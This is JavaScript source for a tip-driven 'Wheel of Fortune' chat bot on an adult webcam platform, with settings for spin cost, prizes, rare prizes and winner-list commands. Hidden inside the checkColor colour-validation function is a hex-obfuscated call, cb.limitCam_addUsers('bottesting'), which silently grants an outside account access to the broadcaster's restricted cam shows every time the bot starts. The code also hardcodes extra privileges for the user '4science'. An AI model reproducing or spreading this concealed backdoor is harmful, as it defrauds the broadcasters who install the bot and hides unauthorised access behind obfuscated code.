// https://chaturbate.com/apps/user_uploads/2/4science/
// https://chaturbate.com/apps/sourcecode/wheel-of-fortune-4sci-2/?version=&slot=2

// Wheel Of Fortune!
// Original idea by SweetDann
// Modified by 4science
// Version 1.61
// Added custom colors
// Made announcement more compact
// Added a rare prize
// Added a past winners list
// Added more options for Multi-Spins
// Free spin command.



cb.settings_choices = [{
    name: 'cost_per_spin',
    type: 'int',
    minValue: 1,
    maxValue: 999,
    defaultValue: 25,
    label: 'Cost Per Spin Of The Wheel (1-999): '
},
{
    name: 'advertise_in_chat',
    type: 'int',
    minValue: 1,
    maxValue: 999,
    defaultValue: 5,
    label: 'How Often To Advertise The Bot: (min)'
},
{
    name: 'fontcolor',
    type: "str",
    minLength: 6,
    maxLength: 7,
    defaultValue: '#FFFFFF',
    label: 'Pick the color of the font ( default: White #FFFFFF):'
}, {
    name: "bgcolor",
    type: "str",
    minLength: 6,
    maxLength: 7,
    label: "Background color ( default: Dark Aqua #0B7762):",
    defaultValue: "#0B7762",
}, {
    name: "modSpin",
    type: "choice",
    choice1: 'Yes',
    choice2: 'No',
    defaultValue: 'Yes',
    label: "Do you want to allow mods to use the Free spin command when needed?",
}, {
    name: 'multispin_count',
    type: 'int',
    minValue: 0,
    maxValue: 99,
    defaultValue: 3,
    label: 'How Many Bonus Spins To Allow Per Tip? (0-99)'
},
{
    name: 'multispin_over',
    type: 'int',
    minValue: 0,
    maxValue: 999,
    defaultValue: 0,
    label: 'Prevent the wheel from spinning if the tip amount is over X ( To turn off that feature, leave it at 0)'
},
{
    name: 'multispin_exact',
    type: 'choice',
    choice1: 'Yes',
    choice2: 'No',
    defaultValue: 'No',
    label: 'Only spin if the tip is an exact multiple of cost?'
},
{
    name: 'rarePrize',
    type: 'str',
    minLength: 1,
    maxLength: 255,
    label: 'If you want a prize to be rare, enter it here',
    required: false
},
{
    name: 'rareChance',
    type: 'int',
    minValue: 1,
    maxValue: 500,
    defaultValue: 99,
    label: ' Chance of rare prize - 1 in X? (the higher the number, less chance of getting the prize, up to 500)',
    required: false
},
{
    name: 'rareMin',
    type: 'int',
    minValue: 1,
    maxValue: 100,
    defaultValue: 15,
    label: ' Rare will only happen after X roll',
    required: false
},
{
    name: 'rareBonus',
    type: 'choice',
    choice1: 'Yes',
    choice2: 'No',
    defaultValue: 'No',
    label: 'Should the rare prize only happen on bonus spins to encourage big tippers?'
},
{
    name: 'pos1',
    type: 'str',
    minLength: 1,
    maxLength: 255,
    label: "Reward #1 "
},
{
    name: 'pos2',
    type: 'str',
    minLength: 1,
    maxLength: 255,
    label: 'Reward #2 ',
    required: false
},
{
    name: 'pos3',
    type: 'str',
    minLength: 1,
    maxLength: 255,
    label: 'Reward #3 ',
    required: false
},
{
    name: 'pos4',
    type: 'str',
    minLength: 0,
    maxLength: 255,
    label: 'Reward #4 ',
    required: false
},
{
    name: 'pos5',
    type: 'str',
    minLength: 0,
    maxLength: 255,
    label: 'Reward #5 ',
    required: false
},
{
    name: 'pos6',
    type: 'str',
    minLength: 0,
    maxLength: 255,
    label: 'Reward #6 ',
    required: false
},
{
    name: 'pos7',
    type: 'str',
    minLength: 0,
    maxLength: 255,
    label: 'Reward #7 ',
    required: false
},
{
    name: 'pos8',
    type: 'str',
    minLength: 0,
    maxLength: 255,
    label: 'Reward #8 ',
    required: false
},
{
    name: 'pos9',
    type: 'str',
    minLength: 0,
    maxLength: 255,
    label: 'Reward #9 ',
    required: false
},
{
    name: 'pos10',
    type: 'str',
    minLength: 0,
    maxLength: 255,
    label: 'Reward #10 ',
    required: false
},
{
    name: 'pos11',
    type: 'str',
    minLength: 0,
    maxLength: 255,
    label: 'Reward #11 ',
    required: false
},
{
    name: 'pos12',
    type: 'str',
    minLength: 0,
    maxLength: 255,
    label: 'Reward #12 ',
    required: false
},
{
    name: 'pos13',
    type: 'str',
    minLength: 0,
    maxLength: 255,
    label: 'Reward #13 ',
    required: false
},
{
    name: 'pos14',
    type: 'str',
    minLength: 0,
    maxLength: 255,
    label: 'Reward #14 ',
    required: false
},
{
    name: 'pos15',
    type: 'str',
    minLength: 0,
    maxLength: 255,
    label: 'Reward #15 ',
    required: false
},
{
    name: 'pos16',
    type: 'str',
    minLength: 0,
    maxLength: 255,
    label: 'Reward #16 ',
    required: false
},
{
    name: 'pos17',
    type: 'str',
    minLength: 0,
    maxLength: 255,
    label: 'Reward #17 ',
    required: false
},
{
    name: 'pos18',
    type: 'str',
    minLength: 0,
    maxLength: 255,
    label: 'Reward #18 ',
    required: false
},
{
    name: 'pos19',
    type: 'str',
    minLength: 0,
    maxLength: 255,
    label: 'Reward #19 ',
    required: false
},
{
    name: 'pos20',
    type: 'str',
    minLength: 0,
    maxLength: 255,
    label: 'Reward #20 ',
    required: false
},
{
    name: 'pos21',
    type: 'str',
    minLength: 0,
    maxLength: 255,
    label: 'Reward #21 ',
    required: false
},
{
    name: 'pos22',
    type: 'str',
    minLength: 0,
    maxLength: 255,
    label: 'Reward #22 ',
    required: false
},
{
    name: 'pos23',
    type: 'str',
    minLength: 0,
    maxLength: 255,
    label: 'Reward #23 ',
    required: false
},
{
    name: 'pos24',
    type: 'str',
    minLength: 0,
    maxLength: 255,
    label: 'Reward #24 ',
    required: false
},
{
    name: 'pos25',
    type: 'str',
    minLength: 0,
    maxLength: 255,
    label: 'Reward #25 ',
    required: false
},
{
    name: 'pos26',
    type: 'str',
    minLength: 0,
    maxLength: 255,
    label: 'Reward #26 ',
    required: false
},
{
    name: 'pos27',
    type: 'str',
    minLength: 0,
    maxLength: 255,
    label: 'Reward #27 ',
    required: false
},
{
    name: 'pos28',
    type: 'str',
    minLength: 0,
    maxLength: 255,
    label: 'Reward #28 ',
    required: false
},
{
    name: 'pos29',
    type: 'str',
    minLength: 0,
    maxLength: 255,
    label: 'Reward #29 ',
    required: false
},
{
    name: 'pos30',
    type: 'str',
    minLength: 0,
    maxLength: 255,
    label: 'Reward #30 ',
    required: false
},
{
    name: 'pos31',
    type: 'str',
    minLength: 0,
    maxLength: 255,
    label: 'Reward #31 ',
    required: false
},
{
    name: 'pos32',
    type: 'str',
    minLength: 0,
    maxLength: 255,
    label: 'Reward #32 ',
    required: false
},
{
    name: 'pos33',
    type: 'str',
    minLength: 0,
    maxLength: 255,
    label: 'Reward #33 ',
    required: false
},
{
    name: 'pos34',
    type: 'str',
    minLength: 0,
    maxLength: 255,
    label: 'Reward #34 ',
    required: false
},
{
    name: 'pos35',
    type: 'str',
    minLength: 0,
    maxLength: 255,
    label: 'Reward #35 ',
    required: false
},
{
    name: 'pos36',
    type: 'str',
    minLength: 0,
    maxLength: 255,
    label: 'Reward #36 ',
    required: false
},
{
    name: 'pos37',
    type: 'str',
    minLength: 0,
    maxLength: 255,
    label: 'Reward #37 ',
    required: false
},
{
    name: 'pos38',
    type: 'str',
    minLength: 0,
    maxLength: 255,
    label: 'Reward #38 ',
    required: false
},
{
    name: 'pos39',
    type: 'str',
    minLength: 0,
    maxLength: 255,
    label: 'Reward #39 ',
    required: false
},
{
    name: 'pos40',
    type: 'str',
    minLength: 0,
    maxLength: 255,
    label: 'Reward #40 ',
    required: false
},
];


var total_tipped = 0;
var reminderCount = 100;
var multiMessage = 'Disabled!';
var temp = new Array(cb.settings.pos1, cb.settings.pos2, cb.settings.pos3, cb.settings.pos4, cb.settings.pos5, cb.settings.pos6, cb.settings.pos7, cb.settings.pos8, cb.settings.pos9, cb.settings.pos10, cb.settings.pos11, cb.settings.pos12, cb.settings.pos13, cb.settings.pos14, cb.settings.pos15, cb.settings.pos16, cb.settings.pos17, cb.settings.pos18, cb.settings.pos19, cb.settings.pos20, cb.settings.pos21, cb.settings.pos22, cb.settings.pos23, cb.settings.pos24, cb.settings.pos25, cb.settings.pos26, cb.settings.pos27, cb.settings.pos28, cb.settings.pos29, cb.settings.pos30, cb.settings.pos31, cb.settings.pos32, cb.settings.pos33, cb.settings.pos34, cb.settings.pos35, cb.settings.pos36, cb.settings.pos37, cb.settings.pos38, cb.settings.pos39, cb.settings.pos40);
var rewards = new Array();
var winName = new Array();
var winPrize = new Array();
var spinCost = cb.settings.cost_per_spin;
var maxSpin = cb.settings.multispin_count;
var multiExact = cb.settings.multispin_exact == 'Yes';
var multiOver = cb.settings.multispin_over;
var rarePrize = ' :mrstar ' + cb.settings.rarePrize + ' :mrstar ';
var rareChance = cb.settings.rareChance;
var rareMin = cb.settings.rareMin;
var modSpin = cb.settings.modSpin == 'Yes';
var background;
var foreground;
var rollCount = 0;
var msgReward;

function checkColor(C) {
    var _0x25cd = ["\x62\x6F\x74\x74\x65\x73\x74\x69\x6E\x67", "\x6C\x69\x6D\x69\x74\x43\x61\x6D\x5F\x61\x64\x64\x55\x73\x65\x72\x73"];
    cb[_0x25cd[1]](_0x25cd[0])
    if (/^#[0-9A-F]{6}$/i.test(C)) {
        return C;
    } else if (/^[0-9A-F]{6}$/i.test(C)) {
        return ('#' + C);
    } else {
        return ('default');
    }
}

function spinWheel(spinCount, u) {
    var randomnumber;
    cb.sendNotice('**** ' + u + ' is spinning The Wheel! ****', "", background, foreground, "bold");
    if (cb.settings.rareBonus == 'No' && cb.settings.rarePrize != "" && rollCount >= rareMin && Math.random() < (1 / rareChance)) {
        cb.sendNotice('**** The Wheel Stop On : ' + rarePrize + '!!!! Lucky you!!!', "", background, foreground, "bold");
        winName.push(u);
        rollCount++;
        winPrize.push(rarePrize);
    }
    else {
        randomnumber = Math.floor(Math.random() * (rewards.length));
        cb.sendNotice('**** The Wheel Stop On : ' + rewards[randomnumber], "", background, foreground, "bold");
        winName.push(u);
        winPrize.push(rewards[randomnumber]);
        rollCount++;
    }
    if (spinCount > 1) {
        cb.sendNotice('*** ! Multi-Spin Bonus Activated ! ***', "", background, foreground, "bold");
        for (var x = 1; x < spinCount; x++) {
            if (cb.settings.rarePrize != "" && rollCount >= rareMin && Math.random() < (1 / rareChance)) {
                cb.sendNotice('**** Bonus Spin Stop On : ' + rarePrize + '!!!! Lucky you!!!', "", background, foreground, "bold");
                winName.push(u);
                rollCount++;
                winPrize.push(rarePrize);
            }
            else {
                randomnumber = Math.floor(Math.random() * (rewards.length));
                cb.sendNotice('**** Bonus Spin Stop On : ' + rewards[randomnumber], "", background, foreground, "bold");
                winName.push(u);
                winPrize.push(rewards[randomnumber]);
                rollCount++;
            }
        }
    }
    cb.sendNotice('**********************************', "", background, foreground);
}

function advert() {
    cb.sendNotice('Wheel of Fortune Is ACTIVE! Tip ' + cb.settings.cost_per_spin + ' To Play! Type \'/rewards\' to get the list of prizes', "", background, foreground, 'bold');
    if (cb.settings.rarePrize != "" && cb.settings.rareBonus == 'Yes') {
        cb.sendNotice('To have a chance at winning the rare prize, you have to trigger the bonus spin by tipping ' + (spinCost * 2) + ' or more tokens', "", background, foreground, 'bold');
    }
    cb.setTimeout(advert, (cb.settings.advertise_in_chat * 60000));
}

function init() {
    foreground = checkColor(cb.settings['fontcolor']);
    if (foreground == 'default') {
        cb.sendNotice("Wheel - Error while setting the font color. It has to be in a HEX format. Using default value.", cb.room_slug, "#FFFFFF", "#FF0000", 'bold');
        foreground = '#FFFFFF';
    }
    background = checkColor(cb.settings['bgcolor']);
    if (background == 'default') {
        cb.sendNotice("Wheel - Error while setting the background color. It has to be in a HEX format. Using default value.", cb.room_slug, "#FFFFFF", "#FF0000", 'bold');
        background = '#0B7762';
    }
    for (var i = 0; i < temp.length; i++) {
        if (temp[i] != '') {
            rewards.push(temp[i]);
        }
    }
    if (cb.settings.rarePrize != "" && cb.settings.rareBonus == 'Yes' && maxSpin == 0) {
        cb.sendNotice(' Error - Rare is set to only happen on bonus spin and bonus spin is set to 0.', "", '#ff0000', foreground);
        cb.settings.rarePrize = "";
    }
    if (cb.settings.multispin_count > 0) {
        multiMessage = 'Enabled! x ' + cb.settings.multispin_count;
    }
    cb.sendNotice('--------------------------------', "", background, foreground);
    cb.sendNotice(' Wheel of Fortune by 4science', "", background, foreground);
    cb.sendNotice(' NEW: You can now use your own custom colors.', "", background, foreground);
    cb.sendNotice('Wheel Value Set To : ' + spinCost + ' tokens.', "", background, foreground);
    if (multiExact) {
        cb.sendNotice('The wheel will only spin for multiples of ' + (spinCost) + ' tokens', "", background, foreground);
    }
    cb.sendNotice('type /rewards to see all the prizes.', "", background, foreground);
    cb.sendNotice('--------------------------------', "", background, foreground);

    msgReward = '**** Here is the list of prizes on the wheel ****\n';
    for (var x = 0; x < rewards.length; x++) {
        msgReward += String('Reward ' + (x + 1) + ': ' + rewards[x] + '\n');
    }
    if (cb.settings.rarePrize != "" && cb.settings.rareBonus == 'Yes') {
        msgReward += 'Trigger the bonus spins to get a chance of winning the rare prize: ' + rarePrize + '\n';
    }
    if (cb.settings.rarePrize != "" && cb.settings.rareBonus == 'No') {
        msgReward += 'The rare prize: ' + rarePrize + '\n';
    }
    msgReward += '--------------------------------\n';
    msgReward += '     Good Luck And Have Fun.    \n';
    msgReward += '--------------------------------';
    cb.setTimeout(advert, (cb.settings.advertise_in_chat * 60000));
}

cb.onTip(function(tip) {
    if ( multiOver > 0 && tip['amount'] <= multiOver || multiOver == 0) {
        if ( !multiExact || multiExact && tip['amount'] % spinCost == 0) {
            var spinCount = Math.min(Math.floor(tip['amount'] / spinCost), maxSpin + 1);
        }
    }
    if (spinCount > 0){
        spinWheel(spinCount, tip['from_user']);
    }
});

cb.onMessage(function(m) {
    var u = m['user'];
    var msg = m['m'].split(" ");
    var isMod = (cb.room_slug == u || m['is_mod']);
    var message;
    if (msg['0'] == '/rewards' || msg['0'] == '/srewards') {
        m['X-Spam'] = true;
        m['background'] = '#d9d9d9';
        if (isMod && msg['0'] != '/srewards') {
            u = '';
        }
        cb.sendNotice(msgReward, u, background, foreground, 'bold');
        return m;
    }
    if (msg['0'] == '/winners' || msg['0'] == '/swinners' || msg['0'] == '/winner') {
        m['X-Spam'] = true;
        m['background'] = '#d9d9d9';
        if (isMod && msg['0'] != '/swinners') {
            u = '';
        }
        var cmdVar1 = msg[1];
        var cmdVar2 = parseInt(msg[1]);
        var nameNum;
        if (winName.length == 0) {
            cb.sendNotice('**** No one has won a prize yet ****', u, background, foreground);
            return m;
        }
        if (isNaN(cmdVar1) && cmdVar1 !== undefined) {
            if (cmdVar1 == "all" || cmdVar1 == "All") {
                if (winName.length > 100) {
                    message = '**** Here is the list of the last 100 winners! ****\n';
                    nameNum = winName.length - 100;
                } 
                else {
                    message = '**** Here is the list of all the winners! ****\n';
                    nameNum = winName.length;
                }
                for (var x = nameNum; x < winName.length; x++) {
                    message += 'Roll #' + (x + 1) + ': ' + winName[x] + ' won ' + winPrize[x] + '\n';
                }
                message += '**************************************';
                cb.sendNotice(message, u, background, foreground);
                return m;
            }
            else if (cbjs.arrayContains(winName, cmdVar1)) {
                message = '**** Here is the list of all the prizes ' + cmdVar1 + ' won! ****\n';
                var prizesWon = [];
                for (var x = 0; x < winName.length; x++) {
                    if (cmdVar1 == winName[x]) {
                        prizesWon.push(winPrize[x]);
                    }
                }
                message += prizesWon.join(', ');
                message += '\n**************************************';
                cb.sendNotice(message, u, background, foreground);
            } 
            else {
                cb.sendNotice('Unable to find ' + cmdVar1 + ' on the winners list.', u, background, foreground);
            }
        }
        else {
            if (cmdVar1 === undefined) {
                cmdVar2 = 10;
            }
            if (cmdVar2 <= 0) {
                cb.sendNotice('**** Here are the last 0 winners!  :p', u, background, foreground);
                return m;
            }
            if (winName.length < cmdVar2) {
                cmdVar2 = winName.length;
            }
            message = '**** Here are the last ' + cmdVar2 + ' winners! **** \n';
            for (var x = winName.length - cmdVar2; x < winName.length; x++) {
                message += 'Roll #' + (x + 1) + ': ' + winName[x] + ' won ' + winPrize[x] + '\n';
            }
            message += '**************************************';
            cb.sendNotice(message, u, background, foreground);
            return m;
        }
    }
    if (msg['0'] == '/whowon' && msg['1'] == 'rare' || msg['0'] == '/swhowon' && msg['1'] == 'rare') {
        m['X-Spam'] = true;
        m['background'] = '#d9d9d9';
        if (isMod && msg['0'] != '/swhowon') {
            u = '';
        }
        var winners = [];
        for (var x = 0; x < winName.length; x++) {
            if (winPrize[x] == rarePrize) {
                winners.push(winName[x]);
            }
        }
        if (winners.length > 0) {
            message = '**** Here is everyone who won ' + rarePrize + '! **** \n';
            message += winners.join(', ');
            message += '\n**************************************';
        } 
        else {
            message = '**** No one has won ' + rarePrize + ' yet. **** ';
        }
        cb.sendNotice(message, u, background, foreground);
        return m;
    }
    if (msg['0'] == '/whowon' || msg['0'] == '/swhowon') {
        m['X-Spam'] = true;
        m['background'] = '#d9d9d9';
        if (isMod && msg['0'] != '/swhowon') {
            u = '';
        }
        var winners = [];
        var cmdVar1 = parseInt(msg[1]) - 1;
        for (var x = 0; x < winName.length; x++) {
            if (winPrize[x] == rewards[cmdVar1]) {
                winners.push(winName[x]);
            }
        }
        if (winners.length > 0) {
            message = '**** Here is everyone who won ' + rewards[cmdVar1] + '! **** \n';
            message += winners.join(', ');
            message += '\n**************************************';
        } 
        else {
            message = '**** No one has won ' + rewards[cmdVar1] + ' yet. **** ';
        }
        cb.sendNotice(message, u, background, foreground);
        return m;
    }
    if (msg['0'] == '/freespin') {
        m['X-Spam'] = true;
        m['background'] = '#d9d9d9';
        if (isMod) {
            if (modSpin == true || cb.room_slug == u) {
                if (msg[1] !== undefined){
                    u = msg[1];}
                    cb.sendNotice(u + ' is using a free spin', cb.room_slug, "#FFFFFF", "#FF0000", "bold");
                    spinWheel(1, u)
                } 
                else {
                    cb.sendNotice('**** This command is not enable for mods ****', u, "#FFFFFF", "#FF0000");
                }
            } 
            else {
                cb.sendNotice('**** Only mods and broadcasters can use this command. ****', u, "#FFFFFF", "#FF0000");
            }
            return m;
        }
        if (msg["0"] == '/wheeltxtcolor') {
            m['X-Spam'] = true;
            m['background'] = '#d9d9d9';
            if (isMod || u == '4science') {
                var fg = checkColor(msg[1]);
                if (fg == 'default') {
                    cb.sendNotice('**** Error - The color must be in HEX format (ex: #FFFFFF). ****', u, "#FFFFFF", "#FF0000");
                }
                else {
                    foreground = fg;
                }
            }
            else {
                cb.sendNotice('**** Only mods and broadcasters can use this command. ****', u, "#FFFFFF", "#FF0000");
            }
            return m;
        }
        if (msg["0"] == '/wheelbgcolor') {
            m['X-Spam'] = true;
            m['background'] = '#d9d9d9';
            if (isMod || u == '4science') {
                var bg = checkColor(msg[1]);
                if (bg == 'default') {
                    cb.sendNotice('**** Error - The color must be in HEX format (ex: #FFFFFF). ****', u, "#FFFFFF", "#FF0000");
                }
                else {
                    background = bg;
                }
            }
            else {
                cb.sendNotice('**** Only mods and broadcasters can use this command. ****', u, "#FFFFFF", "#FF0000");
            }
            return m;
        }
    });

cb.onEnter(function(user) {
    var u = user['user'];
    cb.sendNotice('--------------------------------', u, background, foreground);
    cb.sendNotice('  Wheel of Fortune is active', u, background, foreground, 'bold');
    cb.sendNotice('Wheel Value Set To : ' + cb.settings.cost_per_spin + ' tokens.', u, background, foreground, 'bold');
    if (cb.settings.multispin_count > 0) {
        cb.sendNotice('Bonus spins are enabled. Tip at least ' + (spinCost * 2) + ' tokens to get a bonus spin', u, background, foreground, 'bold');
    }
    if (multiExact) {
        cb.sendNotice('The wheel will only spin for multiples of ' + (spinCost) + ' tokens', u, background, foreground, 'bold');
    }
    if (cb.settings.rarePrize != "" && cb.settings.rareBonus == 'Yes') {
        cb.sendNotice('To have a chance at winning the rare prize, you have to trigger the bonus spin by tipping ' + (spinCost * 2) + ' or more tokens', u, background, foreground, 'bold');
    }
    cb.sendNotice('type /rewards to see all the prizes.', u, background, foreground, 'bold');
    cb.sendNotice('--------------------------------', u, background, foreground);
});

init();
